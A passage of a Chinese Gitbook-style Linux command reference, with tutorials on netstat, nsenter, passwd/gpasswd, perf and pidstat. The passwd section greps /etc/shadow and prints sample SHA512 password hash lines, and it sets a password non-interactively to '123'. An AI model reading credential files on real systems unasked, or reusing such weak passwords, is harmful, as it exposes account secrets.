40280 tcp 0 0 localhost.localdoma:ssh 192.168.211.1:64318 ESTABLISHED root 25954 Active UNIX domain sockets (w/o servers) Proto RefCnt Flags Type State I-Node Path unix 2 [ ] DGRAM 19782 /var/run/chrony/chronyd.sock unix 2 [ ] DGRAM 12252 /run/systemd/shutdownd unix 3 [ ] DGRAM 9450 /run/systemd/notify 实例11：显示关于路由表的信息 $ netstat -r Kernel IP routing table Destination Gateway Genmask Flags MSS Window irtt Iface default gateway 0.0.0.0 UG 0 0 0 eth0 172.17.0.0 0.0.0.0 255.255.0.0 U 0 0 0 docker0 192.168.211.0 0.0.0.0 255.255.255.0 U 0 0 0 eth0 实例12：列出所有 tcp 端口 $ netstat -at Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State tcp 0 0 localhost:smtp 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:sunrpc 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:ssh 0.0.0.0:* LISTEN tcp 0 52 localhost.localdoma:ssh 192.168.211.1:49878 ESTABLISHED tcp 0 0 localhost.localdoma:ssh 192.168.211.1:64318 ESTABLISHED tcp6 0 0 localhost:smtp [::]:* LISTEN tcp6 0 0 [::]:sunrpc [::]:* LISTEN tcp6 0 0 [::]:ssh [::]:* LISTEN 实例13：统计机器中网络连接各个状态个数 $ netstat -a | awk '/^tcp/ {++S[$NF]} END {for(a in S) print a, S[a]}' LISTEN 6 ESTABLISHED 2 实例14：把状态全都取出来后使用uniq -c统计后再进行排序 $ netstat -nat |awk '{print $6}'|sort|uniq -c 1 established) 2 ESTABLISHED 1 Foreign 6 LISTEN netstat -nat |awk '{print $6}'|sort|uniq -c|sort -rn 6 LISTEN 2 ESTABLISHED 1 Foreign 1 established) 实例15：找出程序运行的端口 $ netstat -ap | grep ssh tcp 0 0 0.0.0.0:ssh 0.0.0.0:* LISTEN 1116/sshd tcp 0 52 localhost.localdoma:ssh 192.168.211.1:49878 ESTABLISHED 3406/sshd: root@pts tcp 0 0 localhost.localdoma:ssh 192.168.211.1:64318 ESTABLISHED 1716/sshd: root@pts tcp6 0 0 [::]:ssh [::]:* LISTEN 1116/sshd unix 2 [ ] DGRAM 25487 1716/sshd: root@pts unix 2 [ ] DGRAM 40335 3406/sshd: root@pts unix 3 [ ] STREAM CONNECTED 22118 1116/sshd 实例17：在 netstat 输出中显示 PID 和进程名称 $ netstat -pt Active Internet connections (w/o servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 52 localhost.localdoma:ssh 192.168.211.1:49878 ESTABLISHED 3406/sshd: root@pts tcp 0 0 localhost.localdoma:ssh 192.168.211.1:64318 ESTABLISHED 1716/sshd: root@pts 说明： netstat -p 可以与其它开关一起使用，就可以添加 “PID/进程名称” 到 netstat 输出中，这样 debugging 的时候可以很方便的发现特定端口运行的程序。 实例18：找出运行在指定端口的进程 $ netstat -anpt | grep ':22' tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1116/sshd tcp 0 52 192.168.211.15:22 192.168.211.1:49878 ESTABLISHED 3406/sshd: root@pts tcp 0 0 192.168.211.15:22 192.168.211.1:64318 ESTABLISHED 1716/sshd: root@pts tcp6 0 0 :::22 :::* LISTEN 1116/sshd 参考： 每天一个linux命令（56）：netstat命令 How to Use netstat on Linux 20 Netstat Commands for Linux Network Management netstat(8) - Linux man page Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 08:36:35 "},"Linux-Command/Linux_Command_nsenter.html":{"url":"Linux-Command/Linux_Command_nsenter.html","title":"Linux Command Nsenter","keywords":"","body":"linux Command nsenter1. 简介2. 参数3. 示例4. 原理4.1 namespace4.2 clone4.3 setnslinux Command nsenter tagsstart 容器 tagsstop 1. 简介 nsenter 命令是一个可以在指定进程的命令空间下运行指定程序的命令。它位于util-linux包中。 一个最典型的用途就是进入容器的网络命令空间。相当多的容器为了轻量级，是不包含较为基础的命令的，比如说ip address，ping，telnet，ss，tcpdump等等命令，这就给调试容器网络带来相当大的困扰：只能通过docker inspect ContainerID命令获取到容器IP，以及无法测试和其他网络的连通性。这时就可以使用nsenter命令仅进入该容器的网络命名空间，使用宿主机的命令调试容器网络。 此外，nsenter也可以进入mnt, uts, ipc, pid, user命令空间，以及指定根目录和工作目录。 nsenter 命令相当于在setns之上做了一层封装，使我们无需指定命名空间的文件描述符，而是指定进程号即可。 指定进程号PID以及需要进入的命名空间后，nsenter会帮我们找到对应的命名空间文件描述符/proc/PID/ns/FD，然后使用该命名空间运行新的程序。 2. 参数 nsenter [options] [program [arguments]] options: -t, --target pid：指定被进入命名空间的目标进程的pid -m, --mount[=file]：进入mount命令空间。如果指定了file，则进入file的命令空间 -u, --uts[=file]：进入uts命令空间。如果指定了file，则进入file的命令空间 -i, --ipc[=file]：进入ipc命令空间。如果指定了file，则进入file的命令空间 -n, --net[=file]：进入net命令空间。如果指定了file，则进入file的命令空间 -p, --pid[=file]：进入pid命令空间。如果指定了file，则进入file的命令空间 -U, --user[=file]：进入user命令空间。如果指定了file，则进入file的命令空间 -G, --setgid gid：设置运行程序的gid -S, --setuid uid：设置运行程序的uid -r, --root[=directory]：设置根目录 -w, --wd[=directory]：设置工作目录 如果没有给出program，则默认执行$SHELL。 3. 示例 运行一个nginx容器，查看该容器的pid： [root@staight ~]# docker inspect -f {{.State.Pid}} nginx 5645 然后，使用nsenter命令进入该容器的网络命令空间： [root@staight ~]# nsenter -n -t 5645 [root@staight ~]# ip addr 1: lo: mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever 18: eth0@if19: mtu 1500 qdisc noqueue state UP group default link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0 valid_lft forever preferred_lft forever 或者使用命令 nsenter --target $PID --mount --uts --ipc --net --pid ls 在Kubernetes中，在得到容器pid之前还需获取容器的ID，可以使用如下命令获取： [root@node1 test]# kubectl get pod test -oyaml|grep containerID - containerID: docker://cf0873782d587dbca6aa32f49605229da3748600a9926e85b36916141597ec85 或者更为精确地获取containerID： [root@node1 test]# kubectl get pod test -o template --template='{{range .status.containerStatuses}}{{.containerID}}{{end}}' docker://cf0873782d587dbca6aa32f49605229da3748600a9926e85b36916141597ec85 4. 原理 4.1 namespace namespace是Linux中一些进程的属性的作用域，使用命名空间，可以隔离不同的进程。 Linux在不断的添加命名空间，目前有： mount：挂载命名空间，使进程有一个独立的挂载文件系统，始于Linux 2.4.19 ipc：ipc命名空间，使进程有一个独立的ipc，包括消息队列，共享内存和信号量，始于Linux 2.6.19 uts：uts命名空间，使进程有一个独立的hostname和domainname，始于Linux 2.6.19 net：network命令空间，使进程有一个独立的网络栈，始于Linux 2.6.24 pid：pid命名空间，使进程有一个独立的pid空间，始于Linux 2.6.24 user：user命名空间，是进程有一个独立的user空间，始于Linux 2.6.23，结束于Linux 3.8 cgroup：cgroup命名空间，使进程有一个独立的cgroup控制组，始于Linux 4.6 Linux的每个进程都具有命名空间，可以在/proc/PID/ns目录中看到命名空间的文件描述符。 [root@staight ns]# pwd /proc/1/ns [root@staight ns]# ll total 0 lrwxrwxrwx 1 root root 0 Sep 23 19:53 ipc -> ipc:[4026531839] lrwxrwxrwx 1 root root 0 Sep 23 19:53 mnt -> mnt:[4026531840] lrwxrwxrwx 1 root root 0 Sep 23 19:53 net -> net:[4026531956] lrwxrwxrwx 1 root root 0 Sep 23 19:53 pid -> pid:[4026531836] lrwxrwxrwx 1 root root 0 Sep 23 19:53 user -> user:[4026531837] lrwxrwxrwx 1 root root 0 Sep 23 19:53 uts -> uts:[4026531838] 4.2 clone clone是Linux的系统调用函数，用于创建一个新的进程。 clone和fork比较类似，但更为精细化，比如说使用clone创建出的子进程可以共享父进程的虚拟地址空间，文件描述符表，信号处理表等等。不过这里要强调的是，clone函数还能为新进程指定命名空间。 clone的语法： #define _GNU_SOURCE #include int clone(int (*fn)(void *), void *child_stack, int flags, void *arg, ... /* pid_t *ptid, void *newtls, pid_t *ctid */ ); 其中flags即可指定命名空间，包括： CLONE_NEWCGROUP：cgroup CLONE_NEWIPC：ipc CLONE_NEWNET：net CLONE_NEWNS：mount CLONE_NEWPID：pid CLONE_NEWUSER：user CLONE_NEWUTS：uts 使用示例： pid = clone(childFunc, stackTop, CLONE_NEWUTS | SIGCHLD, argv[1]); 4.3 setns clone用于创建新的命令空间，而setns则用来让当前线程（单线程即进程）加入一个命名空间。 语法 #define _GNU_SOURCE /* See feature_test_macros(7) */ #include int setns(int fd, int nstype); fd参数是一个指向一个命名空间的文件描述符，位于/proc/PID/ns/目录。 nstype指定了允许进入的命名空间，一般可设置为0，表示允许进入所有命名空间。 因此，往往该函数的用法为： 调用setns函数：指定该线程的命名空间。 调用execvp函数：执行指定路径的程序，创建子进程并替换父进程。 这样，就可以指定命名空间运行新的程序了。 代码示例： #define _GNU_SOURCE #include #include #include #include #include #define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \\ } while (0) int main(int argc, char *argv[]) { int fd; if (argc 用示例： ./ns_exec /proc/3550/ns/uts /bin/bash 参考： nsenter命令简介 nsenter(1) — Linux manual page clone(2) — Linux manual page setns(2) — Linux manual page Manage containers in namespaces by using nsenter Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-14 05:19:00 "},"Linux-Command/Linux_Command_passwd.html":{"url":"Linux-Command/Linux_Command_passwd.html","title":"Linux Command Passwd","keywords":"","body":"Linux Command passwd、gpasswd1. passwd1.1 参数1.2 交互修改密码1.3 非交互修改密码1.4 查看用户密码的状态1.5 修改密码 60 天变更、10 天密码失效1.6 锁定用户1.7 解锁用户2. gpasswdLinux Command passwd、gpasswd tagsstart 用户管理 tagsstop 1. passwd Linux passwd命令用来更改使用者的密码 1.1 参数 -d 删除密码 -f 强制执行 -k 更新只能发送在过期之后 -l 停止账号使用 -S 显示密码信息 -u 启用已被停止的账户 -x 设置密码的有效期 -g 修改群组密码 -i 过期后停止用户账号 选择参数： --help 显示帮助信息 --version 显示版本信息 1.2 交互修改密码 passwd 命令后面不接任何参数或用户名，则表示修改当前用户的密码；请看下面的例子； $ passwd 注：没有加任何用户，我是用root用户来执行的passwd 表示修改root用户的密码；下面也有提示； Changing password for user root. New UNIX password: 注：请输入新密码； Retype new UNIX password: 注：验证新密码； passwd: all authentication tokens updated successfully. 注：修改root密码成功； 如果是普通用户执行passwd 只能修改自己的密码； 如果新建用户后，要为新用户创建密码，则用 passwd 用户名 ，注意要以root用户的权限来创建； $ passwd beinan 注：更改或创建beinan用户的密码； Changing password for user beinan. New UNIX password: 注：请输入新密码； Retype new UNIX password: 注：再输入一次； passwd: all authentication tokens updated successfully. 注：成功； 1.3 非交互修改密码 echo \"123\" | passwd --stdin liming 1.4 查看用户密码的状态 $ passwd -S liming liming PS 2013-01-06 0 99999 7 -1 (Password set, SHA512 crypt.) 意思依次是：用户名 密码 设定时间(2013*01-06) 密码修改间隔时间(0) 密码有效期(99999) 警告时间(7) 密码不失效(-1)，密码已使用 \"-S\"选项会显示出密码状态，这里的密码修改间隔时间、密码有效期、警告时间、密码宽限时间其实分别是 /etc/shadow 文件的第四、五、六、七个字段的内容。 1.5 修改密码 60 天变更、10 天密码失效 $ passwd -x 60 -i 10 liming $ passwd -S liming liming PS 2013-01-06 0 60 7 10 (Password set, SHA512 crypt.) 这里显示 SHA512 为密码加密方式，CentOS 6.3 加密方式已经从 MD5 加密更新到 SHA512 加密 1.6 锁定用户 $ passwd -I lamp Locking password for user . passwd:Successg $ passwd -S lamp lamp LK 2013-01-06 0 99999 7 -1 (Password locked.) $ grep \"lamp\" /etc/shadow lamp:!! $6$ZTq7o/9o $lj07iZ0bzW.D1zBa9CsY43d04onskUCzjwiFMNt8PX4GXJoHX9zA1S C9.i Yzh9LZA4fEM2lg92hM9w/p6NS50.:15711:0:99999:7::: 锁定其实就是在加密密码之前加入了\"!!\"，让密码失效而已 1.7 解锁用户 $ passwd -u lamp Unlocking password for user lamp. passwd:Success $ passwd -S lamp lamp PS 2013-01-06 0 99999 7 -1 (Password set, SHA512 crypt.) #可以看到，锁定状态消失 $ grep \"lamp\" /etc/shadow lamp: $6$ZTq7cV9o $lj07iZ0bzW.D1zBa9CsY43d04onskUCzjwiFMNt8PX4GXJoHX9zA1S C9.iYz h9LZA4fEM2lg92hM9w/p6NS50.:15711:0:99999:7::: 2. gpasswd gpasswd命令 是Linux下工作组文件/etc/group和/etc/gshadow管理工具。 -a：添加用户到组； -d：从组删除用户； -A：指定管理员； -M：指定组成员和-A的用途差不多； -r：删除密码； -R：限制用户登入组，只有组中的成员才可以用newgrp加入该组。 1.将userA添加到groupB用户组里面： gpasswd -a userA groupB 注意：添加用户到某一个组可以使用 usermod -G groupB userA 这个命令可以添加一个用户到指定的组，但是以前添加的组就会清空掉， 所以想要添加一个用户到一个组，同时保留以前添加的组时，请使用gpasswd这个命令来添加操作用户。 2.将userA设置为groupA的群组管理员： gpasswd -A userA groupA Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-08-17 09:09:11 "},"Linux-Command/Linux_Command_perf.html":{"url":"Linux-Command/Linux_Command_perf.html","title":"Linux Command Perf","keywords":"","body":"Linux Command Perf 性能剖析1. 简介2. 方法2.1 perf-list2.2 perf-top2.3 perf-stat2.4 perf-record2.5 perf-report2.6 perf-lock2.7 perf traceLinux Command Perf 性能剖析 tagsstart 分析 性能 tagsstop 1. 简介 从2.6.31内核开始，Linux内核自带了一个性能分析工具perf，能够进行函数级与指令级的热点查找。通过它，应用程序可以利用 PMU，tracepoint 和内核中的特殊计数器来进行性能统计。它不但可以分析指定应用程序的性能问题 (per thread)，也可以用来分析内核的性能问题，当然也可以同时分析应用代码和内核，从而全面理解应用程序中的性能瓶颈。 Perf是内置于Linux内核源码树中的性能剖析(profiling)工具。 它基于事件采样原理，以性能事件为基础，支持针对处理器相关性能指标与操作系统相关性能指标的性能剖析。 常用于性能瓶颈的查找与热点代码的定位。 CPU周期(cpu-cycles)是默认的性能事件，所谓的CPU周期是指CPU所能识别的最小时间单元，通常为亿分之几秒，是CPU执行最简单的指令时所需要的时间，例如读取寄存器中的内容，也叫做clock tick。 Perf是一个包含22种子工具的工具集，以下是最常用的5种： perf-list perf-stat perf-top perf-record perf-report perf-trace 2. 方法 2.1 perf-list Perf-list用来查看perf所支持的性能事件，有软件的也有硬件的。 List all symbolic event types. perf list [hw | sw | cache | tracepoint | event_glob] 2.1.1 性能事件的分布 hw：Hardware event，9个 sw：Software event，9个 cache：Hardware cache event，26个 tracepoint：Tracepoint event，775个 sw实际上是内核的计数器，与硬件无关。 hw和cache是CPU架构相关的，依赖于具体硬件。 tracepoint是基于内核的ftrace，主线2.6.3x以上的内核版本才支持。 2.1.2 指定性能事件(以它的属性) -e : u // userspace -e : k // kernel -e : h // hypervisor -e : G // guest counting (in KVM guests) -e : H // host counting (not in KVM guests) 2.1.3 实例 显示内核和模块中，消耗最多CPU周期的函数： $ perf top -e cycles:k 显示分配高速缓存最多的函数： $ perf top -e kmem:kmem_cache_alloc 2.2 perf-top 对于一个指定的性能事件(默认是CPU周期)，显示消耗最多的函数或指令。 System profiling tool. Generates and displays a performance counter profile in real time. perf top [-e | --event=EVENT] [] perf top主要用于实时分析各个函数在某个性能事件上的热度，能够快速的定位热点函数，包括应用程序函数、 模块函数与内核函数，甚至能够定位到热点指令。默认的性能事件为cpu cycles。 2.2.2 输出格式 perf top 第一列：符号引发的性能事件的比例，默认指占用的cpu周期比例。 第二列：符号所在的DSO(Dynamic Shared Object)，可以是应用程序、内核、动态链接库、模块。 第三列：DSO的类型。[.]表示此符号属于用户态的ELF文件，包括可执行文件与动态链接库，[k]表述此符号属于内核或模块。 第四列：符号名。有些符号不能解析为函数名，只能用地址表示。 2.2.3 交互命令 h：显示帮助 UP/DOWN/PGUP/PGDN/SPACE：上下和翻页。 a：annotate current symbol，注解当前符号。能够给出汇编语言的注解，给出各条指令的采样率。 d：过滤掉所有不属于此DSO的符号。非常方便查看同一类别的符号。 P：将当前信息保存到perf.hist.N中。 2.2.4 参数 -e ：指明要分析的性能事件。 -p ：Profile events on existing Process ID (comma sperated list). 仅分析目标进程及其创建的线程。 -k ：Path to vmlinux. Required for annotation functionality. 带符号表的内核映像所在的路径。 -K：不显示属于内核或模块的符号。 -U：不显示属于用户态程序的符号。 -d ：界面的刷新周期，默认为2s，因为perf top默认每2s从mmap的内存区域读取一次性能数据。 -G：得到函数的调用关系图 perf top -G [fractal]，路径概率为相对值，加起来为100%，调用顺序为从下往上。 perf top -G graph，路径概率为绝对值，加起来为该函数的热度。 2.2.5 实例 $ perf top // 默认配置 $ perf top -G // 得到调用关系图 $ perf top -e cycles // 指定性能事件 $ perf top -p 23015,32476 // 查看这两个进程的cpu cycles使用情况 $ perf top -s comm,pid,symbol // 显示调用symbol的进程名和进程号 $ perf top --comms nginx,top // 仅显示属于指定进程的符号 $ perf top --symbols kfree // 仅显示指定的符号 2.3 perf-stat 用于分析指定程序的性能概况。 Run a command and gather performance counter statistics. perf stat [-e | --event=EVENT] [-a] perf stat [-e | --event=EVENT] [-a] - [] 2.3.1 输出格式 $ perf stat ls bin dev elasticsearch-7.2.0-linux-x86_64.tar.gz elasticsearch-7.9.3_2 etc kibana-7.9.3-linux-x86_64 lib media opt root sbin sys usr boot elasticsearch-7.2.0 elasticsearch-7.9.3 elasticsearch-7.9.3-linux-x86_64.tar.gz home kibana-7.9.3-linux-x86_64.tar.gz lib64 mnt proc run srv tmp var Performance counter stats for 'ls': 1.20 msec task-clock # 0.592 CPUs utilized 0 context-switches # 0.000 K/sec 0 cpu-migrations # 0.000 K/sec 270 page-faults # 0.225 M/sec cycles instructions branches branch-misses 0.002023278 seconds time elapsed 0.000000000 seconds user 0.001984000 seconds sys 输出包括ls的执行时间，以及10个性能事件的统计。 task-clock：任务真正占用的处理器时间，单位为ms。CPUs utilized = task-clock / time elapsed，CPU的占用率。 context-switches：上下文的切换次数。 CPU-migrations：处理器迁移次数。Linux为了维持多个处理器的负载均衡，在特定条件下会将某个任务从一个CPU迁移到另一个CPU。 page-faults：缺页异常的次数。当应用程序请求的页面尚未建立、请求的页面不在内存中，或者请求的页面虽然在内存中，但物理地址和虚拟地址的映射关系尚未建立时，都会触发一次缺页异常。另外TLB不命中，页面访问权限不匹配等情况也会触发缺页异常。 cycles：消耗的处理器周期数。如果把被ls使用的cpu cycles看成是一个处理器的，那么它的主频为2.486GHz。可以用cycles / task-clock算出。 stalled-cycles-frontend：略过。 stalled-cycles-backend：略过。 instructions：执行了多少条指令。IPC为平均每个cpu cycle执行了多少条指令。 branches：遇到的分支指令数。branch-misses是预测错误的分支指令数。 2.3.2 参数 -p：stat events on existing process id (comma separated list). 仅分析目标进程及其创建的线程。 -a：system-wide collection from all CPUs. 从所有CPU上收集性能数据。 -r：repeat command and print average + stddev (max: 100). 重复执行命令求平均。 -C：Count only on the list of CPUs provided (comma separated list), 从指定CPU上收集性能数据。 -v：be more verbose (show counter open errors, etc), 显示更多性能数据。 -n：null run - don't start any counters，只显示任务的执行时间 。 -x SEP：指定输出列的分隔符。 -o file：指定输出文件，--append指定追加模式。 --pre ：执行目标程序前先执行的程序。 --post ：执行目标程序后再执行的程序。 (3) 使用例子 执行10次程序，给出标准偏差与期望的比值： # perf stat -r 10 ls > /dev/null 显示更详细的信息： # perf stat -v ls > /dev/null 只显示任务执行时间，不显示性能计数器： # perf stat -n ls > /dev/null 单独给出每个CPU上的信息： # perf stat -a -A ls > /dev/null ls命令执行了多少次系统调用： # perf stat -e syscalls:sys_enter ls 2.4 perf-record 收集采样信息，并将其记录在数据文件中。 随后可以通过其它工具(perf-report)对数据文件进行分析，结果类似于perf-top的。 2.4.1 参数 -e：Select the PMU event. -a：System-wide collection from all CPUs. -p：Record events on existing process ID (comma separated list). -A：Append to the output file to do incremental profiling. -f：Overwrite existing data file. -o：Output file name. -g：Do call-graph (stack chain/backtrace) recording. -C：Collect samples only on the list of CPUs provided. 2.4.2 实例 记录nginx进程的性能数据： $ perf record -p `pgrep -d ',' nginx` 记录执行ls时的性能数据： $ perf record ls -g 记录执行ls时的系统调用，可以知道哪些系统调用最频繁： $ perf record -e syscalls:sys_enter ls 2.5 perf-report 读取perf record创建的数据文件，并给出热点分析结果。 2.5.1 参数 -i：Input file name. (default: perf.data) 2.5.2 实例 $ perf report -i perf.data.2 More 除了以上5个常用工具外，还有一些适用于较特殊场景的工具， 比如内核锁、slab分配器、调度器， 也支持自定义探测点。 2.6 perf-lock 内核锁的性能分析。 Analyze lock events. perf lock {record | report | script | info} 需要编译选项的支持：CONFIG_LOCKDEP、CONFIG_LOCK_STAT。 CONFIG_LOCKDEP defines acquired and release events. CONFIG_LOCK_STAT defines contended and acquired lock events. 2.6.1 参数 -i ：输入文件 -k ：sorting key，默认为acquired，还可以按contended、wait_total、wait_max和wait_min来排序。 2.6.2 实例 # perf lock record ls // 记录 # perf lock report // 报告 2.7 perf trace perf-trace - strace inspired tool 2.7.1 测试场景 我们将使用 4 个 IP，其中 2 个为外部可路由网段（192.168）： localhost，IP 127.0.0.1 一个干净的容器，IP 172.17.0.2 我的手机，通过 USB 连接，IP 192.168.42.129 我的手机，通过 WiFi 连接，IP 192.168.43.1 跟踪 ping 向 172.17.0.2 容器的包，这里我们只关心 net 事件，忽略系统调用信息： $ sudo perf trace --no-syscalls --event 'net:*' ping 172.17.0.2 -c1 > /dev/null 0.000 net:net_dev_queue:dev=docker0 skbaddr=0xffff96d481988700 len=98) 0.008 net:net_dev_start_xmit:dev=docker0 queue_mapping=0 skbaddr=0xffff96d481988700 vlan_tagged=0 vlan_proto=0x0000 vlan_tci=0x0000 protocol=0x0800 ip_summed=0 len=98 data_len=0 network_offset=14 transport_offset_valid=1 transport_offset=34 tx_flags=0 gso_size=0 gso_segs=0 gso_type=0) 0.014 net:net_dev_queue:dev=veth79215ff skbaddr=0xffff96d481988700 len=98) 0.016 net:net_dev_start_xmit:dev=veth79215ff queue_mapping=0 skbaddr=0xffff96d481988700 vlan_tagged=0 vlan_proto=0x0000 vlan_tci=0x0000 protocol=0x0800 ip_summed=0 len=98 data_len=0 network_offset=14 transport_offset_valid=1 transport_offset=34 tx_flags=0 gso_size=0 gso_segs=0 gso_type=0) 0.020 net:netif_rx:dev=eth0 skbaddr=0xffff96d481988700 len=84) 0.022 net:net_dev_xmit:dev=veth79215ff skbaddr=0xffff96d481988700 len=98 rc=0) 0.024 net:net_dev_xmit:dev=docker0 skbaddr=0xffff96d481988700 len=98 rc=0) 0.027 net:netif_receive_skb:dev=eth0 skbaddr=0xffff96d481988700 len=84) 0.044 net:net_dev_queue:dev=eth0 skbaddr=0xffff96d481988b00 len=98) 0.046 net:net_dev_start_xmit:dev=eth0 queue_mapping=0 skbaddr=0xffff96d481988b00 vlan_tagged=0 vlan_proto=0x0000 vlan_tci=0x0000 protocol=0x0800 ip_summed=0 len=98 data_len=0 network_offset=14 transport_offset_valid=1 transport_offset=34 tx_flags=0 gso_size=0 gso_segs=0 gso_type=0) 0.048 net:netif_rx:dev=veth79215ff skbaddr=0xffff96d481988b00 len=84) 0.050 net:net_dev_xmit:dev=eth0 skbaddr=0xffff96d481988b00 len=98 rc=0) 0.053 net:netif_receive_skb:dev=veth79215ff skbaddr=0xffff96d481988b00 len=84) 0.060 net:netif_receive_skb_entry:dev=docker0 napi_id=0x3 queue_mapping=0 skbaddr=0xffff96d481988b00 vlan_tagged=0 vlan_proto=0x0000 vlan_tci=0x0000 protocol=0x0800 ip_summed=2 hash=0x00000000 l4_hash=0 len=84 data_len=0 truesize=768 mac_header_valid=1 mac_header=-14 nr_frags=0 gso_size=0 gso_type=0) 0.061 net:netif_receive_skb:dev=docker0 skbaddr=0xffff96d481988b00 len=84) 只保留事件名和 skbaddr，看起来清晰很多： net_dev_queue dev=docker0 skbaddr=0xffff96d481988700 net_dev_start_xmit dev=docker0 skbaddr=0xffff96d481988700 net_dev_queue dev=veth79215ff skbaddr=0xffff96d481988700 net_dev_start_xmit dev=veth79215ff skbaddr=0xffff96d481988700 netif_rx dev=eth0 skbaddr=0xffff96d481988700 net_dev_xmit dev=veth79215ff skbaddr=0xffff96d481988700 net_dev_xmit dev=docker0 skbaddr=0xffff96d481988700 netif_receive_skb dev=eth0 skbaddr=0xffff96d481988700 net_dev_queue dev=eth0 skbaddr=0xffff96d481988b00 net_dev_start_xmit dev=eth0 skbaddr=0xffff96d481988b00 netif_rx dev=veth79215ff skbaddr=0xffff96d481988b00 net_dev_xmit dev=eth0 skbaddr=0xffff96d481988b00 netif_receive_skb dev=veth79215ff skbaddr=0xffff96d481988b00 netif_receive_skb_entry dev=docker0 skbaddr=0xffff96d481988b00 netif_receive_skb dev=docker0 skbaddr=0xffff96d481988b00 这里面有很多信息。 首先注意，skbaddr 在中间变了（0xffff96d481988700 -> 0xffff96d481988b00） 。变的这里，就是生成了 ICMP echo reply 包，并作为应答包发送的地方。接下来的 时间，这个包的 skbaddr 保持不变，说明没有 copy。copy 非常耗时。 其次，我们可以清楚地看到 packet 在内核的传输路径： docker0 网桥 veth pair 的宿主机端（veth79215ff) veth pair 的容器端（容器里的 eth0） 接下来是相反的返回路径 至此，虽然我们还没有看到网络命名空间，但已经得到了一个不错的全局视图。 上面的信息有些杂，还有很多重复。我们可以选择几个最合适的跟踪点，使得输出看起来 更清爽。要查看所有可用的网络跟踪点，执行 perf list： $ sudo perf list 'net:*' 这个命令会列出 tracepoint 列表，名字类似于 net:netif_rx。冒号前面是事件类型 ，后面是事件名字。这里我选择了 4 个： net_dev_queue netif_receive_skb_entry netif_rx napi_gro_receive_entry 效果： $ sudo perf trace --no-syscalls \\ --event 'net:net_dev_queue' \\ --event 'net:netif_receive_skb_entry' \\ --event 'net:netif_rx' \\ --event 'net:napi_gro_receive_entry' \\ ping 172.17.0.2 -c1 > /dev/null 0.000 net:net_dev_queue:dev=docker0 skbaddr=0xffff8e847720a900 len=98) 0.010 net:net_dev_queue:dev=veth7781d5c skbaddr=0xffff8e847720a900 len=98) 0.014 net:netif_rx:dev=eth0 skbaddr=0xffff8e847720a900 len=84) 0.034 net:net_dev_queue:dev=eth0 skbaddr=0xffff8e849cb8cd00 len=98) 0.036 net:netif_rx:dev=veth7781d5c skbaddr=0xffff8e849cb8cd00 len=84) 0.045 net:netif_receive_skb_entry:dev=docker0 napi_id=0x1 queue_mapping=0 更多阅读： 云原生领域 perf Examples Linux Perf commands perf(1) — Linux manual page Getting started with perf Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 17:16:20 "},"Linux-Command/Linux_Command_pidstat.html":{"url":"Linux-Command/Linux_Command_pidstat.html","title":"Linux Command Pidstat","keywords":"","body":"Linux Command pidstat 监控工具1. 简介2. 安装3. 语法4. 示例4.1 查看所有进程的 CPU 使用情况（ -u -p ALL）4.2 cpu使用情况统计(-u)4.3 内存使用情况统计(-r)4.4 显示各个进程的IO使用情况（-d）4.5 显示每个进程的上下文切换情况（-w）4.6 显示选择任务的线程的统计信息外的额外信息 (-t)4.7 pidstat -T4.8 指定采样周期和采样次数Linux Command pidstat 监控工具 tagsstart 分析 监控 tagsstop 1. 简介 pidstat是sysstat工具的一个命令，用于监控全部或指定进程的cpu、内存、线程、设备IO等系统资源的占用情况。pidstat首次运行时显示自系统启动开始的各项统计信息，之后运行pidstat将显示自上次运行该命令以后的统计信息。用户可以通过指定统计的次数和时间来获得所需的统计信息。 2. 安装 pidstat 是sysstat软件套件的一部分，sysstat包含很多监控linux系统状态的工具，它能够从大多数linux发行版的软件源中获得。 在Debian/Ubuntu系统中可以使用下面的命令来安装: apt-get install sysstat CentOS/Fedora/RHEL版本的linux中则使用下面的命令： yum install sysstat 3. 语法 pidstat 的用法： pidstat [ 选项 ] [ ] [ ] 如下图： 常用的参数： -u：默认的参数，显示各个进程的cpu使用统计 -r：显示各个进程的内存使用统计 -d：显示各个进程的IO使用情况 -p：指定进程号 -w：显示每个进程的上下文切换情况 -t：显示选择任务的线程的统计信息外的额外信息 -T { TASK | CHILD | ALL } 这个选项指定了pidstat监控的。 TASK表示报告独立的task， CHILD关键字表示报告进程下所有线程统计信息。 ALL表示报告独立的task和task下面的所有线程。 注意：task和子线程的全局的统计信息和pidstat选项无关。这些统计信息不会对应到当前的统计间隔，这些统计信息只有在子线程kill或者完成的时候才会被收集。 -V：版本号 -h：在一行上显示了所有活动，这样其他程序可以容易解析。 -I：在SMP环境，表示任务的CPU使用率/内核数量 -l：显示命令名和所有参数 root@test1:~# pidstat Linux 4.15.0-135-generic (test1) 06/29/2021 _x86_64_ (1 CPU) 02:17:49 AM UID PID %usr %system %guest %wait %CPU CPU Command 02:17:49 AM 0 1 0.00 0.00 0.00 0.00 0.01 0 systemd 02:17:49 AM 0 2 0.00 0.00 0.00 0.00 0.00 0 kthreadd 02:17:49 AM 0 7 0.00 0.01 0.00 0.00 0.01 0 ksoftirqd/0 02:17:49 AM 0 8 0.00 0.02 0.00 0.01 0.02 0 rcu_sched pidstat 中， %wait 表示进程等待 CPU 的时间百分比。此时进程是运行状态。 top 中 ，iowait% 则表示等待 I/O 的 CPU 时间百分比。此时进程处于不可中断睡眠态。 等待 CPU 的进程已经在 CPU 的就绪队列中，处于运行状态；而等待 I/O 的进程则处于不可中断状态 4. 示例 4.1 查看所有进程的 CPU 使用情况（ -u -p ALL） [root@master ~]# pidstat -u -p ALL 